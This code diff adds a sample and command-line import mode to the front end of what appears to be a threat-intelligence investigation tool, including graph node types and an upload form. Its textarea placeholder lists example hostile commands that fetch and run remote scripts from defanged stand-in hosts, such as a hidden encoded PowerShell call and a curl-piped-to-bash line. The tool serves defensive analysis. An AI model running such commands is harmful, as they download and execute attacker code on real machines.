@@ -12,12 +12,13 @@ const NODE_COLORS = {
   domain: '#79c0ff', ip: '#ffa657', hash: '#d2a8ff', url: '#56d364',
   cert: '#3fb950', asn: '#e3b341', email: '#f78166', registrar: '#8b949e',
   ns: '#58a6ff', favicon: '#e3b341', jarm: '#bc8cff', report: '#f5a623',
-  country: '#ff7b72', person: '#ff80b3'
+  country: '#ff7b72', person: '#ff80b3', command_line: '#f0883e'
 }
 const NODE_SHAPES = {
   domain: 'ellipse', ip: 'rectangle', ns: 'diamond', registrar: 'hexagon',
   cert: 'round-rectangle', asn: 'barrel', hash: 'triangle', report: 'concave-hexagon',
-  jarm: 'pentagon', url: 'cut-rectangle', country: 'tag', person: 'star'
+  jarm: 'pentagon', url: 'cut-rectangle', country: 'tag', person: 'star',
+  command_line: 'rhomboid'
 }
 const STATUS_COLOR = { running: '#e3b341', done: '#56d364', cleared: '#8b949e',
                        error: '#f85149', quota_exceeded: '#d29922' }
@@ -54,6 +55,7 @@ const MALTEGO_TYPES = {
   jarm:      () => 'maltego.Phrase',
   country:   () => 'maltego.Location.Country',
   person:    () => 'maltego.Person',
+  command_line: () => 'maltego.Phrase',
   report:    () => null,
 }
 
@@ -181,6 +183,14 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
   const [pdfError, setPdfError] = useState('')
   const pdfFileInputRef = useRef(null)
   const pdfAddSeedInputRef = useRef(null)
+  // 'Sample' mode: an uploaded malware sample / dropper / script OR a pasted
+  // command line. The two affordances live in the same tab; whichever one
+  // the analyst fills in wins (file > paste when both are provided).
+  const [sampleFile, setSampleFile] = useState(null)
+  const [sampleText, setSampleText] = useState('')
+  const [sampleBusy, setSampleBusy] = useState(false)
+  const [sampleError, setSampleError] = useState('')
+  const sampleFileInputRef = useRef(null)
   useEffect(() => { /* model-coercion */
     if (allowedModels && allowedModels.length && !allowedModels.includes(model)) {
       setModel(allowedModels[0])
@@ -793,6 +803,7 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
     const v = String(n.value || '').toLowerCase()
     return v === 'working_hypothesis' || v.startsWith('working_hypothesis')
         || v.startsWith('budget_extension')
+        || v === 'lessons_learned'
   }
 
   const addCyNode = useCallback((n) => {
@@ -809,6 +820,15 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
           || (Array.isArray(md.file_names) && md.file_names[0])
           || md.meaningful_name
         if (name) return String(name)
+        return n.value.slice(0, 10) + '…'
+      }
+      if (n.type === 'command_line') {
+        // value is a 16-char sha256 prefix — useless as a label. Prefer
+        // metadata.preview (first line up to 80 chars) so the analyst sees
+        // what the snippet actually starts with on the graph.
+        const md = n.metadata || {}
+        const p = md.preview || md.file_name
+        if (p) return String(p)
         return n.value.slice(0, 10) + '…'
       }
       return n.value
@@ -1119,6 +1139,43 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
       setPdfError(String(e.message || e).slice(0, 200))
     } finally {
       setPdfBusy(false)
+    }
+  }
+
+  // ── Sample / command-line import ───────────────────────────────────────
+  // Bootstrap an investigation from either an uploaded sample (binary or
+  // script — its sha256 becomes the seed) or a pasted command line / script
+  // (extracted IOCs become the seeds, the raw text becomes a command_line
+  // context node + report_context for the agent).
+  const startFromSample = async () => {
+    const text = sampleText.trim()
+    if (!sampleFile && !text) return
+    setSampleBusy(true); setSampleError('')
+    try {
+      const fd = new FormData()
+      if (sampleFile) fd.append('file', sampleFile)
+      if (text)       fd.append('text', text)
+      fd.append('model', model)
+      const r = await fetch('/api/investigations/from_sample', {
+        method: 'POST', body: fd, credentials: 'same-origin'
+      })
+      if (!r.ok) {
+        const t = await r.text(); throw new Error(t || `HTTP ${r.status}`)
+      }
+      const d = await r.json()
+      await refreshInvs()
+      openInv(d.id)
+      setSampleFile(null)
+      setSampleText('')
+      if (sampleFileInputRef.current) sampleFileInputRef.current.value = ''
+      const what = d.filename
+        ? `sample "${d.filename}" (${d.file_type})`
+        : 'pasted command'
+      setEvents(e => [`▶ ${what}: ${d.seeds_queued} seed(s) queued`, ...e])
+    } catch (e) {
+      setSampleError(String(e.message || e).slice(0, 200))
+    } finally {
+      setSampleBusy(false)
     }
   }
 
@@ -1644,9 +1701,13 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
         <div className="logo-row"><img className="logo-mark logo-mark-sidebar" src="/logo-256.png" alt="" /><div className="logo">BOUNCE<span>CTI</span></div>{isAdmin && <button className="admin-btn" title="Admin panel" onClick={() => setAdminOpen(true)}>⚙</button>}<button className="logout-btn" title="Log out" onClick={onLogout}>⎋</button></div>
 
         <div className="section-label">New investigation</div>
-        {/* Segmented control: IOC (paste one or many — auto-detected, auto-batched)
-            vs PDF (upload an existing CTI report and let the agent read it). */}
-        <div className="seg-control" role="tablist" aria-label="Investigation mode">
+        {/* Segmented control:
+            - IOC: paste one or many indicators (auto-detected, auto-batched).
+            - Sample: upload an executable / dropper / archive OR paste a
+              command line / script — the agent hashes the binary, extracts
+              embedded IOCs, and reads the raw text as context.
+            - PDF: upload an existing CTI report and let the agent read it. */}
+        <div className="seg-control seg-control-3" role="tablist" aria-label="Investigation mode">
           <button
             type="button"
             role="tab"
@@ -1657,6 +1718,17 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
           >
             <span className="seg-icon" aria-hidden="true">◆</span>
             IOC
+          </button>
+          <button
+            type="button"
+            role="tab"
+            aria-selected={inputMode === 'sample'}
+            className={`seg-option${inputMode === 'sample' ? ' active' : ''}`}
+            onClick={() => setInputMode('sample')}
+            title="Upload a malware sample / dropper / archive, or paste a malicious command line"
+          >
+            <span className="seg-icon" aria-hidden="true">⚙</span>
+            Sample
           </button>
           <button
             type="button"
@@ -1739,6 +1811,50 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
             {pdfError && <div className="pdf-error">{pdfError}</div>}
           </div>
         )}
+        {inputMode === 'sample' && (
+          <div className="sample-pane">
+            <input
+              ref={sampleFileInputRef}
+              id="sample-file-input"
+              type="file"
+              onChange={e => {
+                setSampleFile(e.target.files?.[0] || null)
+                setSampleError('')
+              }}
+              hidden
+            />
+            <label htmlFor="sample-file-input" className="pdf-drop-target">
+              {sampleFile ? (
+                <>
+                  <span className="pdf-drop-icon" aria-hidden="true">⚙</span>
+                  <span className="pdf-drop-name" title={sampleFile.name}>
+                    {sampleFile.name.length > 38 ? sampleFile.name.slice(0, 36) + '…' : sampleFile.name}
+                  </span>
+                  <span className="pdf-drop-meta">
+                    {(sampleFile.size / 1024).toFixed(1)} KB · click to replace
+                  </span>
+                </>
+              ) : (
+                <>
+                  <span className="pdf-drop-icon" aria-hidden="true">⬆</span>
+                  <span className="pdf-drop-name">Drop an executable / dropper / archive</span>
+                  <span className="pdf-drop-meta">Hashed locally — file is not stored (max 25 MB)</span>
+                </>
+              )}
+            </label>
+            <div className="sample-or">or paste a command line / script</div>
+            <textarea
+              className="batch-textarea"
+              value={sampleText}
+              onChange={e => setSampleText(e.target.value)}
+              placeholder={'powershell -nop -w hidden -enc <base64>\ncurl http://evil[.]tld/x.sh | bash\nmshta hxxps://bad[.]site/p.hta'}
+              rows={4}
+              disabled={!!sampleFile}
+              title={sampleFile ? 'Clear the file selection to paste a command' : ''}
+            />
+            {sampleError && <div className="pdf-error">{sampleError}</div>}
+          </div>
+        )}
         <div className="section-label">Model</div>
         <select value={model} onChange={e => setModel(e.target.value)}>
           {(!allowedModels || allowedModels.includes('sonnet')) && <option value="sonnet">Sonnet 4.6 (recommended)</option>}
@@ -1748,15 +1864,20 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
         </select>
         <button
           onClick={
-            inputMode === 'pdf' ? startFromPdf : start
+            inputMode === 'pdf'    ? startFromPdf
+            : inputMode === 'sample' ? startFromSample
+            : start
           }
           disabled={
             (inputMode === 'pdf' && (pdfBusy || !pdfFile)) ||
+            (inputMode === 'sample' && (sampleBusy || (!sampleFile && !sampleText.trim()))) ||
             (inputMode === 'ioc' && parseSeedInput(seedText).length === 0)
           }
         >
           {inputMode === 'pdf'
             ? (pdfBusy ? 'Analyse du PDF…' : 'Importer le rapport →')
+            : inputMode === 'sample'
+            ? (sampleBusy ? 'Hashing & extracting…' : (sampleFile ? 'Submit sample →' : 'Investigate command →'))
             : (() => {
                 const n = parseSeedInput(seedText).length
                 if (n <= 1) return 'Investigate →'
